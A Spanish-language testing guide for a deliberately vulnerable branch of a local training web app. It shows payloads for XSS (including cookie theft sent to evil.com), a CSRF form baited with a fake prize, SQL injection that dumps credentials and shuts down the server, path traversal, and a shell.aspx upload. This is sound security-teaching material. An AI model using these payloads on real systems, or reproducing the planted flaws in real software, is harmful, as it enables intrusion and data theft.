# Guía de Pruebas de Vulnerabilidades

Esta guía describe cómo explotar las vulnerabilidades deliberadamente incluidas en la rama `vulnerable` del proyecto.

## Requisitos

- Aplicación corriendo en `http://localhost:5132` (rama `vulnerable`)
- Navegador web (Chrome, Firefox o Edge)
- [curl](https://curl.se/) o [Postman](https://www.postman.com/) para pruebas CSRF

---

## 1. Cross-Site Scripting (XSS)

### Endpoint vulnerable: `/Home/XssEcho`

```
http://localhost:5132/Home/XssEcho?nombre=<script>alert('XSS')</script>
```

**Qué ocurre**: El parámetro `nombre` se renderiza directamente con `@Html.Raw()` sin escapar, ejecutando cualquier código JavaScript.

### Pruebas:

**Alerta básica:**
```
http://localhost:5132/Home/XssEcho?nombre=<script>alert('XSS')</script>
```

**Robo de cookies (simulado):**
```
http://localhost:5132/Home/XssEcho?nombre=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**Redirección maliciosa:**
```
http://localhost:5132/Home/XssEcho?nombre=<script>window.location='https://malicious-site.com'</script>
```

### Endpoint vulnerable: Búsqueda de países

```
http://localhost:5132/Country/Index?search=<script>alert('XSS')</script>
```

**Qué ocurre**: El valor de `search` se renderiza con `@Html.Raw()` en el campo de búsqueda, ejecutando scripts.

---

## 2. Cross-Site Request Forgery (CSRF)

Los formularios POST en `CityController` y `CountryLanguageController` **no tienen** `[ValidateAntiForgeryToken]`, lo que permite enviar peticiones desde sitios externos.

### Prueba con CityController (Crear ciudad):

Crear un archivo `csrf_attack.html`:

```html
<html>
<body>
  <h2>¡Ganaste un premio!</h2>
  <form action="http://localhost:5132/City/Create" method="POST">
    <input type="hidden" name="Name" value="HackCity" />
    <input type="hidden" name="CountryCode" value="MEX" />
    <input type="hidden" name="District" value="Hacked" />
    <input type="hidden" name="Population" value="99999999" />
    <input type="submit" value="¡Reclamar premio!" />
  </form>
</body>
</html>
```

**Pasos:**
1. Inicia sesión en la aplicación como admin
2. Abre `csrf_attack.html` en otra pestaña
3. Haz clic en "Reclamar premio"
4. La ciudad se crea sin que el usuario lo sepa, usando su sesión activa

### Prueba con curl (sin cookie):

```bash
curl -X POST http://localhost:5132/City/Create ^
  -d "Name=EvilCity&CountryCode=ARG&District=Hacked&Population=100"
```

**Nota**: Necesitas incluir la cookie de sesión para que funcione (o estar autenticado en el navegador mientras ejecutas curl con `--cookie`).

---

## 3. Inyección SQL (SQLi)

### Endpoint vulnerable: `/Country/SqlSearch`

```
http://localhost:5132/Country/SqlSearch?q=MEX
```

**Qué ocurre**: El endpoint concatena el parámetro `q` directamente en una consulta SQL sin parametrizar.

### Pruebas:

**Búsqueda normal:**
```
http://localhost:5132/Country/SqlSearch?q=MEX
```

**Inyección de siempre verdadero:**
```
http://localhost:5132/Country/SqlSearch?q=' OR '1'='1
```

**Inyección UNION para mostrar otras tablas:**
```
http://localhost:5132/Country/SqlSearch?q=' UNION SELECT Username, Password, Nivel, Status FROM cgusuarios --
```

**Inyección para obtener estructura de tablas (MySQL):**
```
http://localhost:5132/Country/SqlSearch?q=' UNION SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE, IS_NULLABLE FROM INFORMATION_SCHEMA.COLUMNS --
```

**Inyección para apagar el servidor (peligroso, no probar en producción):**
```
http://localhost:5132/Country/SqlSearch?q='; SHUTDOWN; --
```

---

## 4. Path Traversal

### Endpoint vulnerable: Subida y eliminación de banderas

La aplicación permite leer y eliminar archivos fuera del directorio `wwwroot/uploads/flags/` usando `../` en la ruta.

### Prueba de eliminación de archivo sensible:

La función `DeleteFlagFile` concatena directamente la URL sin validar `../`.

Desde el controlador `CountryController`, cuando se edita un país y se elimina la bandera anterior, si la URL de la bandera contiene `/../../../windows/system32/config/SAM` (ejemplo teórico), intentaría eliminar ese archivo.

**Prueba directa:**
1. Ve a Editar un país: `http://localhost:5132/Country/Edit/MEX`
2. En teoría, si `FlagUrl` contuviera `../../../../appsettings.json`, se podría acceder a archivos fuera del directorio permitido.

**Verificación de lectura de archivos:**
La función `GetFlagBytes` no valida la ruta normalizada contra el directorio base, lo que permite leer cualquier archivo al que el proceso tenga acceso.

---

## 5. Vulnerabilidad de Carga de Archivos

### Endpoint vulnerable: Crear/Editar país (subida de bandera)

El servicio `FileValidationService` en la rama `vulnerable` **siempre retorna válido**, sin importar el tipo de archivo.

### Prueba:

1. Ve a `http://localhost:5132/Country/Create`
2. En el campo "Bandera", selecciona un archivo `.aspx`, `.php`, `.exe` o cualquier otro tipo
3. Completa los demás campos y envía el formulario
4. El archivo se guarda con su **nombre original** en `wwwroot/uploads/flags/`
5. Si el archivo es un script del lado del servidor (`.aspx`), el atacante podría ejecutarlo en el servidor

**Ejemplo de archivo malicioso `shell.aspx`:**
```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.IO.File.ReadAllText(@"C:\Windows\win.ini")); %>
```

**Resultado**: El archivo se sube y queda accesible en:
```
http://localhost:5132/uploads/flags/shell.aspx
```

---

## Resumen de Diferencias entre Ramas

| Vulnerabilidad | Rama `main` (protegida) | Rama `vulnerable` |
|---|---|---|
| **XSS** | `@` Razor escapa HTML, CSP bloquea scripts inline | `@Html.Raw()` renderiza sin escapar, sin CSP |
| **CSRF** | `[AutoValidateAntiforgeryToken]` global + `[ValidateAntiForgeryToken]` en cada POST | Sin filtro global, atributos removidos |
| **SQLi** | Solo consultas parametrizadas con EF Core | Endpoint `SqlSearch` con concatenación directa |
| **Path Traversal** | `Path.GetFullPath()` + validación contra `wwwroot` | `Path.Combine()` sin validación, `..` no filtrado |
| **File Upload** | Magic bytes, MIME type, extensión, nombre seguro con GUID | Sin validación, nombre original del archivo |
